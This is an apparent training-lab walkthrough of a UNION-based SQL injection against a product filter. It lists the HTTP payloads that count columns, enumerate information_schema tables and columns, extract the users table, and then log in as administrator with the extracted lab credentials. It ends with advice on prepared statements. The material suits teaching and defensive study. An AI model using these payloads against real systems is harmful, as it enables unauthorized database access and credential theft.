# Lab 07: SQL injection attack, listing the database contents on non-Oracle databases

**Goal**: Log in as the `administrator` user by extracting credentials from the database.

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a `UNION` attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents to obtain all usernames and passwords.

---

## 🎯 Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns returned by the query and which columns contain text data.
3. Query `information_schema.tables` to list all tables in the database.
4. Find the users table (e.g., `users_aebvnb`), then query `information_schema.columns` to find its column names.
5. Extract all credentials from the users table and log in as `administrator`.

![Lab 7 Solution Summary](Pasted%20image%2020260829190403.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Find Column Count
Test using `ORDER BY`:
```http
/filter?category=Gifts'+ORDER+BY+1--
/filter?category=Gifts'+ORDER+BY+2--
/filter?category=Gifts'+ORDER+BY+3--
```

> [!NOTE]
> Receiving an internal server error on `ORDER BY 3` confirms that the query returns **2 columns**.

### Step 2: Confirm Text Columns
Test both columns with string values:
```http
/filter?category=Gifts'+UNION+SELECT+'a','a'--
```

Both columns accept text values ✅

### Step 3: Enumerate All Tables
Query `information_schema.tables` to list all available tables:
```http
/filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

Scan through the results and identify the suspicious users table (e.g., `users_aebvnb`).

> [!NOTE]
> `information_schema.tables` is a built-in system table available in PostgreSQL, MySQL, and Microsoft SQL Server that stores metadata about all tables in the database.

### Step 4: Enumerate Columns of the Target Table
Query `information_schema.columns` to find the column names of the target table:
```http
/filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_aebvnb'--
```

Example results:
```text
username_aebvnb
password_aebvnb
```

### Step 5: Extract User Credentials
Inject a query to retrieve all usernames and passwords from the target table:
```http
/filter?category=Gifts'+UNION+SELECT+username_aebvnb,password_aebvnb+FROM+users_aebvnb--
```

#### Extracted Credentials:
| Username | Password |
|---|---|
| `administrator` | `p4ssw0rd` |
| `carlos` | `letmein` |
| `wiener` | `peter` |

### Step 6: Login as Administrator
Navigate to `/login` and submit the administrator credentials.

> [!SUCCESS]
> **Lab Solved**: Successfully logged in as Administrator!

---

## 💡 Key Takeaways: Why "Non-Oracle"?

This technique relies on `information_schema`, which is available in:
- ✅ PostgreSQL
- ✅ MySQL
- ✅ Microsoft SQL Server

But **not available in Oracle**. Oracle uses `ALL_TABLES` and `ALL_COLUMNS` instead.

| System | Table Metadata | Column Metadata |
|---|---|---|
| PostgreSQL / MySQL / MSSQL | `information_schema.tables` | `information_schema.columns` |
| Oracle | `ALL_TABLES` | `ALL_COLUMNS` |

---

## 🔒 Prevention

> [!TIP]
> Use **Prepared Statements** to eliminate SQL injection vulnerabilities:
> ```php
> // VULNERABLE
> $query = "SELECT * FROM products WHERE category = '$category'";
>
> // SAFE - Prepared Statement
> $stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
> $stmt->execute([$category]);
> ```
> Additional measures: apply the **principle of least privilege** for database accounts, disable verbose error messages in production, use a **WAF (Web Application Firewall)**, and validate/sanitize all user input.